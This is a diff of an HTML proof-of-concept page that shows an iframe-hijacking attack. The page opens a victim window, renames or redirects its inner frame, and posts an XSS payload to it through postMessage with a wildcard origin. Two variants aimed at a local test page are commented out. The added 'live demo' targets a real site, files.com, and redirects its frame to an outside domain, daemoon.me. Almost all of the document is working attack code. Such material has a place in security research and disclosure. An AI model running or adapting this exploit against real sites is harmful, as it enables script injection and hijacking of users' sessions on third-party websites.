@@ -10,22 +10,51 @@
     <button onclick="openNewTab()">Open New Tab</button>
 
     <script>
+        // Method 1: Open a new tab, then hijack the iframe by targeting its name
+        // function openNewTab() {
+        //     // 1. Open victim.html (which contains <iframe name="myframe">)
+        //     window.open("victim.html", "_blank", "width=500,height=500");
+
+        //     // 2. Hijack the iframe by targeting its name — navigates it to victim.html
+        //     setTimeout(function() {
+        //         let x = window.open("victim.html", "myframe");
+
+        //         // 3. Wait for the hijacked iframe to load, then postMessage to it
+        //         setTimeout(function() {
+        //             // x.postMessage("badr", '*');
+        //             x.postMessage("<img src=x onerror=alert(1)>", '*');
+        //         }, 2000);
+        //     }, 2000);
+        // }
+
+        // Method 2: Open a new tab, then hijack the iframe by targeting its index
+        // function openNewTab() {
+        //     let w = window.open("victim.html", "_blank", "width=500,height=500");
+        //     setTimeout(() => {
+        //         // Navigate inner iframe
+        //         w.frames[0].location = "victim.html";
+        //     }, 2000);
+        //     setTimeout(() => {
+        //         // Post message to inner iframe
+        //         w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
+        //     }, 2500);
+        // }
+
+        // live demo
         function openNewTab() {
-            // 1. Open victim.html (which contains <iframe name="myframe">)
-            window.open("victim.html", "_blank", "width=500,height=500");
-
-            // 2. Hijack the iframe by targeting its name — navigates it to victim.html
-            setTimeout(function() {
-                let x = window.open("victim.html", "myframe");
-
-                // 3. Wait for the hijacked iframe to load, then postMessage to it
-                setTimeout(function() {
-                    x.postMessage("badr", '*');
-                }, 2000);
+            let w = window.open("https://www.files.com/", "_blank", "width=500,height=500");
+            setTimeout(() => {
+                // Navigate inner iframe
+                w.frames[0].location = "https://daemoon.me/alert.html";
             }, 2000);
+            setTimeout(() => {
+                // Post message to inner iframe
+                w.frames[0].postMessage("<img src=x onerror=alert(1)>", '*');
+            }, 2500);
         }
     </script>
 
+    
     <!-- <iframe name="myframe" width="1000" height="400"></iframe>
     <script>
         function openNewTab() {
